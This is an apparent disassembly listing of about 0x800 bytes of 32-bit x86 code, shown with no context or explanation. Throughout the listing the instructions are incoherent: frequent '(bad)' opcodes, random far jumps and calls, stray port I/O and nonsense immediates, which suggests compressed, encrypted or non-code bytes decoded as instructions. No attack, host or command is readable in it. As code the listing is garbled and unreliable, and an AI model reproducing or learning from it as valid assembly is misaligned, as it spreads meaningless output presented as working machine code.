  4028c5:	dec    esp
  4028c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028c7:	les    ebx,FWORD PTR [ebp-0x172bab7c]
  4028cd:	jp     0x40290e
  4028cf:	mov    eax,ds:0xc7023753
  4028d4:	(bad)  [edx-0x1f2b865f]
  4028da:	sar    DWORD PTR [ecx],0x1f
  4028dd:	or     bh,ah
  4028df:	in     ax,dx
  4028e1:	stos   BYTE PTR es:[edi],al
  4028e2:	call   esp
  4028e4:	les    esi,FWORD PTR [edx+0x15]
  4028e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028e8:	(bad)  
  4028e9:	xor    al,0xb8
  4028eb:	loopne 0x402944
  4028ed:	sub    bh,BYTE PTR [ecx+0x79]
  4028f0:	push   0xaf81517b
  4028f5:	mov    eax,0x567c5974
  4028fa:	aam    0xd4
  4028fc:	aaa    
  4028fd:	clc    
  4028fe:	cmp    al,0x3f
  402900:	or     eax,0x9f7f579f
  402905:	cwde   
  402906:	iret   
  402907:	out    0x49,al
  402909:	fcom   DWORD PTR [esp+edx*8-0x47b3ecd7]
  402910:	in     al,0x7c
  402912:	sub    al,0xd4
  402914:	dec    ecx
  402915:	test   bl,dh
  402917:	and    al,0xdd
  402919:	sbb    dl,BYTE PTR ds:0x902daa7e
  40291f:	xor    al,0x58
  402921:	rol    BYTE PTR ds:[esp+ebx*1],1
  402925:	fs inc ebx
  402927:	fisttp WORD PTR [eax-0x2a6ee91f]
  40292d:	xchg   DWORD PTR [esi+edx*4],edi
  402930:	or     al,0xf6
  402932:	push   cs
  402933:	(bad)  
  402934:	fidiv  DWORD PTR [esi]
  402936:	push   0xffffffd5
  402938:	retf   
  402939:	std    
  40293a:	mov    bh,0xb
  40293c:	and    ecx,DWORD PTR [edx]
  40293e:	aam    0x16
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	push   es
  402942:	dec    eax
  402943:	dec    eax
  402945:	mov    BYTE PTR [ebx+0x78a3ba87],cl
  40294b:	push   cs
  40294c:	xchg   ecx,eax
  40294d:	aam    0x86
  40294f:	rcl    BYTE PTR [esi],1
  402951:	mov    edx,0xc8d422d4
  402956:	js     0x402971
  402958:	std    
  402959:	pushf  
  40295a:	lea    edi,[ecx+ebx*1-0x1f]
  40295e:	mov    ds:0x67a74c7b,eax
  402963:	or     eax,0xff7f22cb
  402968:	loope  0x40294d
  40296a:	sahf   
  40296b:	push   edx
  40296c:	sub    edx,esp
  40296e:	ret    0x1e00
  402971:	xor    bl,BYTE PTR ds:0x7c3d2d1e
  402977:	pushf  
  402978:	les    ebp,FWORD PTR [ebp+0x1ce01cc0]
  40297e:	std    
  40297f:	xchg   ebp,eax
  402980:	mov    edx,edx
  402982:	dec    ebp
  402983:	loope  0x4029e2
  402985:	mov    al,0xa7
  402987:	jnp    0x402979
  402989:	add    eax,0x25f3082d
  40298e:	aas    
  40298f:	je     0x402a00
  402991:	outs   dx,BYTE PTR ds:[esi]
  402992:	(bad)  [esi-0x23]
  402995:	push   esi
  402996:	or     al,0xc3
  402998:	clc    
  402999:	cwde   
  40299a:	jge    0x402969
  40299c:	jle    0x4029cc
  40299e:	cmp    bl,0x35
  4029a1:	xor    al,0xc2
  4029a3:	xor    BYTE PTR [edi],ah
  4029a5:	push   ss
  4029a6:	mov    BYTE PTR [esi-0x30],al
  4029a9:	pop    esp
  4029aa:	ins    BYTE PTR es:[edi],dx
  4029ab:	sub    DWORD PTR [eax],0x532be50f
  4029b1:	jl     0x402971
  4029b3:	fld    DWORD PTR [ebp+0x5]
  4029b6:	or     ah,bh
  4029b8:	jp     0x4029ca
  4029ba:	aas    
  4029bb:	inc    esp
  4029bc:	sub    al,0xb4
  4029be:	(bad)  
  4029bf:	fchs   
  4029c1:	pop    edx
  4029c2:	ds pop edi
  4029c4:	and    DWORD PTR [ebx],edi
  4029c6:	scas   eax,DWORD PTR es:[edi]
  4029c7:	loope  0x4029ff
  4029c9:	lahf   
  4029ca:	lds    esp,FWORD PTR [ecx]
  4029cc:	sub    BYTE PTR [esp+ebx*2+0x5c068868],bl
  4029d3:	jecxz  0x402965
  4029d5:	ret    
  4029d6:	xor    DWORD PTR [ecx-0x5f49f69c],ebp
  4029dc:	ret    0x78dc
  4029df:	mov    bh,0x64
  4029e1:	jecxz  0x402a37
  4029e3:	xchg   esi,eax
  4029e4:	stos   BYTE PTR es:[edi],al
  4029e5:	into   
  4029e6:	sub    al,0xdd
  4029e8:	arpl   WORD PTR [eax-0x6cad85e4],cx
  4029ee:	pop    ebx
  4029ef:	cwde   
  4029f0:	out    0x8b,eax
  4029f2:	stos   BYTE PTR es:[edi],al
  4029f3:	push   esp
  4029f4:	push   ds
  4029f5:	into   
  4029f6:	cmp    DWORD PTR [ebx+eax*2-0x69d00f79],esi
  4029fd:	xchg   esi,eax
  4029fe:	dec    edx
  4029ff:	daa    
  402a00:	sar    BYTE PTR [esp+eax*1-0x8],cl
  402a04:	push   eax
  402a05:	ror    DWORD PTR [eax],0x41
  402a08:	pop    edx
  402a09:	add    eax,esp
  402a0b:	pop    ebx
  402a0c:	dec    ebx
  402a0d:	frstor [edi]
  402a0f:	pop    ss
  402a10:	or     ah,BYTE PTR [edx]
  402a12:	repz cwde 
  402a14:	push   esi
  402a15:	xchg   esi,eax
  402a16:	std    
  402a17:	jp     0x40299f
  402a19:	aam    0x9
  402a1b:	jle    0x402a8b
  402a1d:	add    BYTE PTR [ebx+0x4],dh
  402a20:	into   
  402a21:	xor    esi,esp
  402a23:	pop    ebp
  402a24:	les    esp,FWORD PTR [eax+ebp*2]
  402a27:	icebp  
  402a28:	xchg   esp,eax
  402a29:	mov    ah,0x24
  402a2b:	jmp    0xe84b:0xcba746c5
  402a32:	sti    
  402a33:	mov    ebx,0xde597166
  402a38:	jo     0x4029ff
  402a3a:	xchg   ebx,eax
  402a3b:	xchg   edi,eax
  402a3c:	sbb    ecx,DWORD PTR [esi-0x1f73891]
  402a42:	or     eax,0x52309b8c
  402a47:	mov    eax,ds:0xde49c882
  402a4c:	pushf  
  402a4d:	psllw  mm6,QWORD PTR [ecx]
  402a50:	jmp    0x76ec:0x13f637dd
  402a57:	mov    esi,0xe45ff0f0
  402a5c:	mov    ebp,0x49ff4a27
  402a61:	aaa    
  402a62:	adc    esp,DWORD PTR ds:0xcd21aafa
  402a68:	gs nop
  402a6a:	shr    DWORD PTR [eax+0x11],cl
  402a6d:	cmp    BYTE PTR [edi+ebp*4-0x66],0xcf
  402a72:	retf   
  402a73:	adc    bh,dh
  402a75:	iret   
  402a76:	dec    ecx
  402a77:	cmp    bh,bh
  402a79:	test   ch,ah
  402a7b:	sahf   
  402a7c:	loopne 0x402a6f
  402a7e:	sbb    ebp,ebx
  402a80:	push   ebx
  402a81:	mov    al,0x86
  402a83:	je     0x402a1a
  402a85:	pop    ds
  402a86:	enter  0x4012,0x83
  402a8a:	popf   
  402a8b:	in     al,0xba
  402a8d:	push   cs
  402a8e:	fsubr  DWORD PTR [edx-0x43]
  402a91:	imul   ebx,DWORD PTR [ebx+0x7a],0x4f
  402a95:	mov    ah,0x25
  402a97:	push   esp
  402a98:	mov    eax,ds:0x465e5fc8
  402a9d:	shl    DWORD PTR [ebx+0x33],0x6d
  402aa1:	dec    esi
  402aa2:	push   0xe3c6bc02
  402aa7:	cwde   
  402aa8:	call   0x26f148ee
  402aad:	mov    dh,bl
  402aaf:	sti    
  402ab0:	or     bl,BYTE PTR [eax]
  402ab2:	cli    
  402ab3:	cmp    esp,DWORD PTR [ecx+0xc]
  402ab6:	pop    esp
  402ab7:	sub    al,0x96
  402ab9:	xchg   edi,eax
  402aba:	cwde   
  402abb:	enter  0x3ae9,0x1b
  402abf:	and    DWORD PTR [eax+esi*2+0x2a8289c8],ecx
  402ac6:	mov    cl,0xc0
  402ac8:	dec    eax
  402ac9:	sub    al,cl
  402acb:	stc    
  402acc:	cmp    al,0x5
  402ace:	call   0x55c5:0x3505a049
  402ad5:	cld    
  402ad6:	pop    ds
  402ad7:	loope  0x402b29
  402ad9:	outs   dx,DWORD PTR ds:[esi]
  402ada:	cwde   
  402adb:	pop    esp
  402adc:	cmp    eax,0x613b6be1
  402ae1:	adc    dl,bl
  402ae3:	mov    ch,0x90
  402ae5:	fisub  WORD PTR [esi+0x49f87ad2]
  402aeb:	iret   
  402aec:	xchg   esp,eax
  402aed:	popf   
  402aee:	scas   al,BYTE PTR es:[edi]
  402aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402af0:	adc    DWORD PTR [ebx+eiz*4-0x326c69ef],eax
  402af7:	shr    DWORD PTR [edx],cl
  402af9:	dec    eax
  402afa:	les    ebx,FWORD PTR [edi]
  402afc:	mov    dh,0xa8
  402afe:	sar    BYTE PTR [esi-0x1f],cl
  402b01:	loopne 0x402b72
  402b03:	test   BYTE PTR [edi-0x1e],0x26
  402b07:	jne    0x402b34
  402b09:	mov    esp,0x15bff92e
  402b0e:	sub    ebx,eax
  402b10:	fisubr WORD PTR [edi]
  402b12:	pusha  
  402b13:	shl    BYTE PTR [ecx+0x61],1
  402b16:	mov    esp,esi
  402b18:	out    dx,eax
  402b19:	ja     0x402aea
  402b1b:	int    0x4c
  402b1d:	cdq    
  402b1e:	pop    ebx
  402b1f:	mov    ecx,DWORD PTR fs:[eax]
  402b22:	add    eax,0x4f8dd330
  402b27:	add    ebp,DWORD PTR [esi+0x2]
  402b2a:	retf   
  402b2b:	xchg   ecx,eax
  402b2c:	sbb    dh,BYTE PTR cs:[esi-0x6ff555bc]
  402b33:	push   edx
  402b34:	(bad)  
  402b35:	push   ebx
  402b36:	dec    edx
  402b37:	push   ebx
  402b38:	test   eax,0x43513df
  402b3d:	jno    0x402b49
  402b3f:	pop    ebx
  402b40:	mov    dh,0x9a
  402b42:	fwait
  402b43:	sti    
  402b44:	ds hlt 
  402b46:	(bad)  
  402b47:	loopne 0x402bb9
  402b49:	imul   esi,DWORD PTR [ebp+edx*8-0x79],0x89d551b2
  402b51:	mov    cs,WORD PTR [edx]
  402b53:	jno    0x402b05
  402b55:	out    dx,al
  402b56:	fistp  QWORD PTR [ebx-0x58]
  402b59:	jo     0x402ae1
  402b5b:	xchg   esp,eax
  402b5c:	outs   dx,DWORD PTR ss:[esi]
  402b5e:	inc    esp
  402b5f:	mov    bh,0x35
  402b61:	sbb    ah,ch
  402b63:	and    al,0xc
  402b65:	fiadd  WORD PTR [ebx+0xbcd75d7]
  402b6b:	xchg   edi,eax
  402b6c:	outs   dx,DWORD PTR ds:[esi]
  402b6d:	leave  
  402b6e:	leave  
  402b6f:	jno    0x402beb
  402b71:	cli    
  402b72:	cmp    eax,0xfff8dd0b
  402b77:	fwait
  402b78:	pop    ebp
  402b79:	push   cs
  402b7a:	xchg   esp,eax
  402b7b:	jno    0x402b18
  402b7d:	push   eax
  402b7e:	ficomp DWORD PTR [ecx+0x355bd932]
  402b84:	out    dx,eax
  402b85:	adc    al,0x94
  402b87:	mov    bl,BYTE PTR [esi]
  402b89:	scas   eax,DWORD PTR es:[edi]
  402b8a:	cmp    dl,BYTE PTR fs:[ebx+0x21]
  402b8e:	and    edi,DWORD PTR [ebx+0x36]
  402b91:	clc    
  402b92:	and    BYTE PTR [eax+0x53],bh
  402b95:	mov    DWORD PTR gs:[ebx-0x50],ecx
  402b99:	fwait
  402b9a:	xchg   edx,eax
  402b9b:	jmp    0x7a4c548c
  402ba0:	leave  
  402ba1:	inc    esi
  402ba2:	pop    esp
  402ba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ba4:	sbb    BYTE PTR [edi-0x46],al
  402ba7:	inc    eax
  402ba8:	inc    edx
  402ba9:	dec    edx
  402baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bab:	xor    DWORD PTR [eax+ecx*1-0x6e],esp
  402baf:	xchg   esp,eax
  402bb0:	jge    0x402c06
  402bb2:	push   ss
  402bb3:	(bad)  [ecx-0x5]
  402bb6:	cmc    
  402bb7:	xchg   edi,eax
  402bb8:	aad    0x37
  402bba:	cmp    cl,dh
  402bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bbd:	test   eax,0x97103733
  402bc2:	ret    
  402bc3:	fcomi  st,st(2)
  402bc5:	int3   
  402bc6:	add    dl,BYTE PTR [edx]
  402bc8:	sbb    esp,DWORD PTR [ecx+0x327e70f6]
  402bce:	xor    BYTE PTR [esi+edx*2+0x65],dh
  402bd2:	xchg   esi,eax
  402bd3:	mov    WORD PTR [edi],ss
  402bd5:	js     0x402c29
  402bd7:	ds (bad) 
  402bd9:	ret    0x2901
  402bdc:	ins    BYTE PTR es:[edi],dx
  402bdd:	daa    
  402bde:	mov    esi,0xe78cf4fb
  402be3:	jae    0x402bf1
  402be5:	sub    BYTE PTR [ebp+0x55],0x92
  402be9:	(bad)  
  402beb:	xor    BYTE PTR [ecx+0x10],dh
  402bee:	fst    DWORD PTR [ebx-0x74]
  402bf1:	lds    eax,FWORD PTR [ebp+0x116458b]
  402bf7:	cmp    al,0x35
  402bf9:	pop    edi
  402bfa:	mov    al,0xcb
  402bfc:	mov    ebx,0x32f019c9
  402c01:	fadd   QWORD PTR [ecx-0x2e]
  402c04:	dec    ebp
  402c05:	and    BYTE PTR [esp+ebp*1],0x9e
  402c09:	aas    
  402c0a:	xor    BYTE PTR [edi-0x1c],0xe1
  402c0e:	retf   
  402c0f:	push   edx
  402c10:	mov    dh,0xf
  402c12:	pop    edx
  402c13:	repz push edi
  402c15:	xchg   ecx,eax
  402c16:	gs ret 0x3289
  402c1a:	mov    esp,0xf584a53
  402c1f:	jae    0x402baa
  402c21:	dec    DWORD PTR [esi-0x55]
  402c24:	and    DWORD PTR [ecx+0x79d651ce],ecx
  402c2a:	and    DWORD PTR [edi-0x5d],esi
  402c2d:	mov    dh,0x2
  402c2f:	xor    al,0x25
  402c31:	(bad)  
  402c32:	push   0xdc8d8b9c
  402c37:	mov    WORD PTR [eax+0x16],?
  402c3a:	inc    BYTE PTR [ecx+0x70]
  402c3d:	js     0x402c7f
  402c3f:	xchg   ecx,eax
  402c40:	mov    dh,0x36
  402c42:	cmp    esi,DWORD PTR [ebx-0x427dc4f8]
  402c48:	sar    BYTE PTR [eax+0x2a],1
  402c4b:	xchg   esi,eax
  402c4c:	lea    eax,[edi-0xb]
  402c4f:	push   0x885ccbc9
  402c54:	inc    edx
  402c55:	jnp    0x402bdd
  402c57:	jne    0x402ca8
  402c59:	push   ss
  402c5a:	cmp    BYTE PTR [eax],dh
  402c5c:	in     al,0x9
  402c5e:	mov    ebp,DWORD PTR [ecx]
  402c60:	add    BYTE PTR [edi+0x46],0x42
  402c64:	fstp   TBYTE PTR [edi]
  402c66:	or     bl,BYTE PTR [edi-0x43676753]
  402c6c:	push   ecx
  402c6d:	sti    
  402c6e:	xor    al,0x78
  402c70:	add    BYTE PTR [eax-0x24858703],bh
  402c76:	mov    BYTE PTR [esi-0x61],al
  402c79:	in     eax,dx
  402c7a:	int3   
  402c7b:	xchg   esp,eax
  402c7c:	push   esp
  402c7d:	pop    ecx
  402c7e:	imul   esp
  402c80:	mov    ss,WORD PTR [ebp-0x3b87a973]
  402c86:	rcr    dh,1
  402c88:	mov    ebx,0x474448af
  402c8d:	sub    al,0x26
  402c90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c91:	cmp    eax,0x7368b171
  402c96:	loopne 0x402c3e
  402c98:	and    DWORD PTR ds:0xf387823a,eax
  402c9e:	push   ebp
  402c9f:	neg    dh
  402ca1:	(bad)  
  402ca2:	fcmovu st,st(0)
  402ca4:	dec    edi
  402ca5:	loop   0x402c9e
  402ca7:	cmc    
  402ca8:	fwait
  402ca9:	xchg   BYTE PTR [ecx+0x18a6b398],bl
  402caf:	cmova  edi,edi
  402cb2:	out    dx,al
  402cb3:	sbb    dh,bh
  402cb5:	enter  0x621b,0xa0
  402cb9:	fsub   DWORD PTR [ebp+0x42]
  402cbc:	pop    es
  402cbd:	mov    bl,bl
  402cbf:	cdq    
  402cc0:	dec    esi
  402cc1:	aad    0x31
  402cc3:	xor    BYTE PTR [ecx+0x1cc9e8bd],dl
  402cc9:	repz aas 
  402ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ccc:	or     al,0x36
  402cce:	or     al,0xbe
  402cd0:	scas   eax,DWORD PTR es:[edi]
  402cd1:	adc    al,BYTE PTR [edi+0x167b140d]
  402cd7:	in     eax,dx
  402cd8:	cmp    al,BYTE PTR [edi+0x3b0f3cc5]
  402cde:	or     esi,DWORD PTR [eax-0x55]
  402ce1:	outs   dx,BYTE PTR ds:[esi]
  402ce2:	fidivr WORD PTR [eax+0x6f]
  402ce5:	xchg   esp,eax
  402ce6:	ret    0x5206
  402ce9:	enter  0x39aa,0x56
  402ced:	clc    
  402cee:	dec    esi
  402cef:	mov    ah,0xa0
  402cf1:	pop    ds
  402cf2:	and    DWORD PTR [ecx],ebp
  402cf4:	ror    BYTE PTR [ecx+esi*8],cl
  402cf7:	pop    esp
  402cf8:	push   ecx
  402cf9:	sbb    ebp,ecx
  402cfb:	push   0xffffffdd
  402cfd:	mov    esi,0x73c36cc2
  402d02:	add    DWORD PTR [ecx-0xa],ebx
  402d05:	inc    DWORD PTR [esi+0x73]
  402d08:	xchg   ecx,eax
  402d09:	aad    0x9a
  402d0b:	adc    al,0xb6
  402d0d:	sub    DWORD PTR [edi-0x389fc27e],edi
  402d13:	pop    edi
  402d14:	adc    eax,0x51c1f05c
  402d19:	xor    esi,DWORD PTR [ebx+0xf]
  402d1c:	jae    0x402d98
  402d1e:	imul   ecx
  402d20:	sete   BYTE PTR [ebx-0x2a487715]
  402d27:	jmp    0x402d3a
  402d29:	and    al,0x93
  402d2b:	fwait
  402d2c:	cmp    esp,DWORD PTR [esi+ecx*4-0x40]
  402d30:	inc    edi
  402d31:	sbb    BYTE PTR [ebx],cl
  402d33:	(bad)  
  402d34:	sub    edi,DWORD PTR [esi+0x13]
  402d37:	push   esi
  402d38:	jmp    0x70dd:0x63630e39
  402d3f:	int    0x62
  402d41:	xor    DWORD PTR [esi],ebp
  402d43:	imul   ebx,edi,0x46cee9ba
  402d49:	jmp    0x402db7
  402d4b:	arpl   ax,bx
  402d4d:	cmp    DWORD PTR [ebx+0xd],edi
  402d50:	or     ebx,ebx
  402d52:	rcl    DWORD PTR [edi],cl
  402d54:	imul   ebx,ebp,0xa8dae2d7
  402d5a:	push   ds
  402d5b:	neg    BYTE PTR [edi]
  402d5d:	je     0x402d5a
  402d5f:	es jae 0x402dcf
  402d62:	dec    edi
  402d63:	scas   al,BYTE PTR es:[edi]
  402d64:	(bad)  
  402d65:	or     DWORD PTR [ecx+0x2e87d1f3],esp
  402d6b:	adc    eax,0x2cf61e3a
  402d70:	mov    dh,0x5a
  402d72:	(bad)  
  402d73:	sbb    DWORD PTR [edx+0x161b431c],0xc98ca129
  402d7d:	aad    0xab
  402d7f:	lods   eax,DWORD PTR ds:[esi]
  402d80:	sti    
  402d81:	mov    eax,ds:0x302ae973
  402d86:	adc    bh,BYTE PTR ds:[eax-0x58]
  402d8a:	push   esp
  402d8b:	mov    ebx,0xd0250822
  402d90:	out    0x51,eax
  402d92:	lock sub al,0xc9
  402d95:	lock rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d98:	je     0x402d4d
  402d9a:	or     eax,DWORD PTR [eax+0x4b27ab6d]
  402da0:	cmp    DWORD PTR [esi],ebp
  402da2:	(bad)  
  402da3:	shr    BYTE PTR [eax+0x6285ecfd],1
  402da9:	out    0x5,eax
  402dab:	pop    edi
  402dac:	mov    DWORD PTR [edi+ebp*8-0xea892d9],0x8301a699
  402db7:	retf   0x6195
  402dba:	outs   dx,DWORD PTR ds:[esi]
  402dbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dbc:	dec    ebp
  402dbd:	xchg   esi,eax
  402dbe:	popa   
  402dbf:	imul   ecx,DWORD PTR [esi+0x4adafa6],0x561a15ee
  402dc9:	jae    0x402e22
  402dcb:	mov    eax,ds:0xdf6a2b8c
  402dd0:	mov    bl,0x9a
  402dd2:	xchg   ecx,eax
  402dd3:	(bad)
  402dd7:	pusha  
  402dd8:	mov    bh,0xaf
  402dda:	out    dx,al
  402ddb:	enter  0xfb06,0x2d
  402ddf:	lahf   
  402de0:	jb     0x402db8
  402de2:	pop    ebx
  402de3:	iret   
  402de4:	scas   eax,DWORD PTR es:[edi]
  402de5:	call   0x4c1e:0x1a759839
  402dec:	fcom   DWORD PTR [esi]
  402dee:	das    
  402def:	aas    
  402df0:	imul   ebp,ecx,0x602e612e
  402df6:	pop    ebp
  402df7:	push   edx
  402df8:	xchg   DWORD PTR [esi+0x27521c4],ebp
  402dfe:	push   edi
  402dff:	add    eax,DWORD PTR [eax]
  402e01:	fimul  DWORD PTR [esi+0x25c4dcaa]
  402e07:	test   cl,al
  402e09:	fdiv   QWORD PTR [ebx+0x6e]
  402e0c:	dec    ax
  402e0e:	cmp    BYTE PTR [eax-0x6325b077],cl
  402e14:	mov    al,0xe1
  402e16:	stc    
  402e17:	adc    esi,0xffffffb8
  402e1a:	pop    DWORD PTR [edx]
  402e1c:	mov    DWORD PTR [edi-0x2d],esi
  402e1f:	mov    ebx,0xaf9d9e57
  402e24:	and    BYTE PTR [ebp+0x3d22f007],bl
  402e2a:	hlt    
  402e2b:	mov    esp,0xa417aeda
  402e30:	gs fdivrp st(2),st
  402e33:	cmp    BYTE PTR [esi+0x54b30924],dl
  402e39:	mov    cl,0xf6
  402e3b:	sub    DWORD PTR [edi],ebp
  402e3d:	clc    
  402e3e:	dec    edx
  402e3f:	jp     0x402e40
  402e41:	retf   0x5a5d
  402e44:	xchg   ebx,eax
  402e45:	jp     0x402e3c
  402e47:	mov    esp,0x31ebd3c0
  402e4c:	out    dx,al
  402e4d:	call   0x1ed5242a
  402e52:	(bad)  
  402e54:	xchg   edi,eax
  402e55:	jo     0x402dfe
  402e57:	sub    ch,cl
  402e59:	lods   eax,DWORD PTR ds:[esi]
  402e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e5b:	leave  
  402e5c:	call   0x77df043c
  402e61:	std    
  402e62:	mov    dl,0x45
  402e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e65:	lea    edi,[edi]
  402e67:	int    0x21
  402e69:	(bad)  
  402e6a:	cmp    edi,ebx
  402e6c:	mov    al,ds:0x1a3f7415
  402e71:	gs jae 0x402e89
  402e74:	mov    ch,0x1f
  402e76:	not    DWORD PTR [ebx+0x1c]
  402e79:	in     al,dx
  402e7a:	mov    ebx,0x54a8a35b
  402e7f:	sub    edi,ebx
  402e81:	rol    dh,1
  402e83:	ja     0x402e44
  402e85:	jmp    0xcbaf:0x2aeed456
  402e8c:	neg    DWORD PTR [ebp-0x43]
  402e8f:	test   BYTE PTR [ebp+edx*4-0x12],0xc7
  402e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e95:	add    BYTE PTR [ecx*2+0x6833795d],dh
  402e9c:	and    eax,0x88135669
  402ea1:	push   0x64de85bf
  402ea6:	push   0x336432ec
  402eab:	stos   BYTE PTR es:[edi],al
  402eac:	inc    esp
  402ead:	fwait
  402eae:	hlt    
  402eaf:	push   esp
  402eb0:	ds mov esp,0xb7c54aaf
  402eb6:	inc    ecx
  402eb7:	add    eax,0x6ba7aecd
  402ebc:	shl    ch,0xd
  402ebf:	push   ss
  402ec0:	int3   
  402ec1:	sbb    ebp,ebx
  402ec3:	xlat   BYTE PTR fs:[ebx]
  402ec5:	mov    bl,0x86
  402ec7:	pop    ebx
  402ec8:	xchg   DWORD PTR [edx],esi
  402eca:	(bad)  [edi]
  402ecc:	jge    0x402e5e
  402ece:	mov    al,ds:0xd56e0e66
  402ed3:	push   cs
  402ed4:	(bad)  
  402ed5:	aaa    
  402ed6:	out    dx,al
  402ed7:	icebp  
  402ed8:	pop    es
  402ed9:	ss (bad) 
  402edb:	sbb    al,0xec
  402edd:	xor    ch,BYTE PTR [ebp+0x4866c156]
  402ee3:	xchg   ecx,eax
  402ee4:	push   eax
  402ee5:	(bad)  
  402ee6:	loop   0x402e87
  402ee8:	fs and al,0x4c
  402eeb:	cvtpi2ps xmm7,QWORD PTR [ecx-0x7744fc2d]
  402ef2:	xor    al,0x71
  402ef4:	jns    0x402ed0
  402ef6:	sbb    BYTE PTR [ebx+esi*8+0x2becc3ef],0xf7
  402efe:	test   al,0xa0
  402f00:	pop    eax
  402f01:	ins    BYTE PTR es:[edi],dx
  402f02:	push   eax
  402f03:	mov    dh,0xb9
  402f05:	lahf   
  402f06:	inc    edi
  402f07:	jae    0x402f68
  402f09:	call   0xcae0ba1d
  402f0e:	push   0xb59a1fca
  402f13:	sbb    dh,BYTE PTR [esi+ecx*4+0x41]
  402f17:	rol    BYTE PTR [ecx+eiz*2],0x18
  402f1b:	jno    0x402ece
  402f1d:	loopne 0x402ef5
  402f1f:	outs   dx,DWORD PTR ds:[esi]
  402f20:	xor    BYTE PTR [eax],bl
  402f22:	int3   
  402f23:	push   es
  402f24:	nop
  402f25:	xchg   esp,eax
  402f26:	xor    bh,bl
  402f28:	add    al,0xf8
  402f2a:	inc    edi
  402f2b:	mov    ds:0x6d8dd5a3,eax
  402f30:	ins    DWORD PTR es:[edi],dx
  402f31:	mov    ebp,0x55154a2e
  402f36:	adc    al,0x69
  402f38:	mov    eax,ds:0x2bab40a4
  402f3d:	xor    bh,dl
  402f3f:	(bad)  
  402f40:	mov    al,0x52
  402f42:	test   al,0xb9
  402f44:	xchg   esp,eax
  402f45:	jne    0x402f57
  402f47:	out    0x3d,eax
  402f49:	ror    BYTE PTR [edi],1
  402f4b:	mov    ch,0xae
  402f4d:	inc    edx
  402f4e:	jle    0x402f8f
  402f50:	repz push ss
  402f52:	inc    esi
  402f53:	mov    BYTE PTR [edi-0x219d1e0e],0xe1
  402f5a:	xchg   ebp,ecx
  402f5c:	cmp    BYTE PTR [esi+0x1e],ah
  402f5f:	fs cmp eax,0xb2b8c9d7
  402f65:	cwde   
  402f66:	jg     0x402f8d
  402f68:	cwde   
  402f69:	inc    ebp
  402f6a:	sub    BYTE PTR [eax+0x7483b47],dl
  402f70:	mov    ds:0xe319e69c,eax
  402f75:	or     DWORD PTR [edx-0x7c],ecx
  402f78:	mov    ebx,0x904771fb
  402f7d:	sub    esp,esi
  402f7f:	nop
  402f80:	fistp  QWORD PTR [eax-0x38b4d50f]
  402f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f87:	mov    al,0xb
  402f89:	push   ss
  402f8a:	stos   DWORD PTR es:[edi],eax
  402f8b:	or     edx,DWORD PTR [esi+0x19476238]
  402f91:	bnd jge 0xfb675ba8
  402f98:	or     BYTE PTR [ebx+0x49],0x5f
  402f9c:	pop    ecx
  402f9d:	inc    esi
  402f9e:	out    dx,al
  402f9f:	ins    BYTE PTR es:[edi],dx
  402fa0:	scas   eax,DWORD PTR es:[edi]
  402fa1:	pop    es
  402fa2:	ja     0x402f39
  402fa4:	pop    edi
  402fa5:	cmp    eax,0x6e5e1446
  402faa:	test   eax,0xc959de32
  402faf:	cmp    edx,ebx
  402fb1:	ret    0x92be
  402fb4:	test   DWORD PTR [eax],edx
  402fb6:	xchg   ecx,ecx
  402fb8:	cmp    al,0xfe
  402fba:	xor    dh,bh
  402fbc:	mov    esi,DWORD PTR [edi+0x1f]
  402fbf:	jle    0x402f9f
  402fc1:	stc    
  402fc2:	fwait
  402fc3:	scas   eax,DWORD PTR es:[edi]
  402fc4:	in     al,dx
  402fc5:	adc    edi,ecx
  402fc7:	fs mov ecx,0x7e01e813
  402fcd:	lods   al,BYTE PTR ds:[esi]
  402fce:	test   ecx,eax
  402fd0:	test   BYTE PTR [ecx],ah
  402fd2:	mov    esp,0xfc76e61b
  402fd7:	pop    edi
  402fd8:	rol    BYTE PTR [edi-0x58],0x2f
  402fdc:	pop    ebp
  402fdd:	aas    
  402fde:	jle    0x403058
  402fe0:	aaa    
  402fe1:	xor    BYTE PTR [ecx-0x16cd383e],al
  402fe7:	sub    al,0x3e
  402fe9:	div    DWORD PTR gs:[edi+0x1c5fca55]
  402ff0:	jae    0x403046
  402ff2:	pop    esi
  402ff3:	shl    BYTE PTR [ecx],0xf5
  402ff6:	push   ds
  402ff7:	add    esp,esp
  402ff9:	mov    ebp,0xbbcd7de0
  402ffe:	leave  
  402fff:	rcr    DWORD PTR [ecx+0x58a411fa],cl
  403005:	inc    esp
  403006:	xchg   esi,eax
  403007:	popf   
  403008:	sbb    eax,0xdcd698bd
  40300d:	ins    DWORD PTR es:[edi],dx
  40300e:	imul   ebp,DWORD PTR [edi+0x3d],0xc9ae178e
  403015:	imul   edi,DWORD PTR [ebp+0x75],0xa6b5c329
  40301c:	shrd   DWORD PTR [edx-0x37],eax,0x77
  403021:	es icebp 
  403023:	cwde   
  403024:	ds call 0xf46c2956
  40302a:	(bad)  
  40302b:	fcom   DWORD PTR [eax+0x57]
  40302e:	(bad)  
  40302f:	ds or  ebx,ecx
  403032:	mov    ds:0x692bab73,eax
  403037:	inc    ecx
  403038:	fistp  QWORD PTR [edi+0x5cd8d3d2]
  40303e:	add    al,0xf9
  403040:	int    0x24
  403042:	(bad)  
  403043:	mov    ecx,0x60ca859a
  403048:	cmp    ebp,0xfffffff4
  40304b:	or     DWORD PTR [ebx+0x54c03bfb],esi
  403051:	loope  0x403004
  403053:	shl    DWORD PTR [eax+0x3a2c3d68],1
  403059:	dec    edi
  40305a:	ret    
  40305b:	add    DWORD PTR [ecx-0x3041d2da],0x2e68782f
  403065:	push   es
